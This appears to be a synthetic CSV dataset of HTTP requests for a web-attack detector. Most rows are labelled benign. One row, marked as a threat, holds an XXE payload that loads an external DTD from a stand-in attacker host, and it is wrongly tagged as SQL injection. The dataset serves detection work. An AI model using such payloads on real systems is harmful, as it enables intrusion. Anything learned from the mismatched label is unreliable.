body,confidence,headers,id,injection_point,label,method,path,pattern,source_ip,threat_type,timestamp
,0.0,"{""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""multipart/form-data""}",benign_38266,,benign,POST,/terms,,53.219.61.25,,2025-11-24T12:26:25.987166
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_46930,,benign,GET,/api/status,,4.8.183.49,,2025-11-23T19:25:57.987998
name=John&email=john@example.com&message=Hello,0.0,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/x-www-form-urlencoded""}",benign_15219,,benign,POST,/dashboard,,210.110.48.240,,2025-11-24T04:58:37.986927
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_86144,,benign,DELETE,/products,,46.103.106.188,,2025-11-23T23:39:26.986617
,0.0,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""multipart/form-data""}",benign_12901,,benign,POST,/privacy,,61.211.22.176,,2025-11-24T10:53:27.987267
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_59490,,benign,DELETE,/js/app.js,,102.114.44.194,,2025-11-23T18:54:56.986135
,0.0,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_99726,,benign,GET,/privacy,,55.86.182.49,,2025-11-24T11:26:12.987112
name=John&email=john@example.com&message=Hello,0.0,"{""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""multipart/form-data""}",benign_28227,,benign,PUT,/api/products,,190.200.197.193,,2025-11-23T23:43:38.988890
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/x-www-form-urlencoded""}",benign_94322,,benign,PUT,/images/logo.png,,228.41.72.18,,2025-11-24T09:54:15.983366
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""multipart/form-data""}",benign_55531,,benign,POST,/faq,,144.19.30.113,,2025-11-24T04:55:05.986682
,0.0,"{""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_61473,,benign,DELETE,/profile,,185.55.23.180,,2025-11-24T01:48:59.985277
,0.0,"{""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_29598,,benign,GET,/css/style.css,,65.31.233.155,,2025-11-23T15:32:14.983400
,0.0,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_10917,,benign,GET,/faq?category=fcsg&q=64,,227.175.143.79,,2025-11-24T03:46:25.988369
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_76498,,benign,DELETE,/css/style.css,,231.90.204.44,,2025-11-24T09:42:05.987508
normal=data&field=value,0.902405612036773,"{""User-Agent"": ""Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"", ""Accept"": ""*/*"", ""Connection"": ""close"", ""Content-Type"": ""application/x-www-form-urlencoded""}",threat_83544,path,threat,PUT,/search/%3C%21ENTITY%20xxe%20SYSTEM%20%27http%3A//attacker.com/evil.dtd%27%3E,<!ENTITY xxe SYSTEM 'http://attacker.com/evil.dtd'>,252.149.235.47,sql_injection,2025-11-24T06:01:18.989565
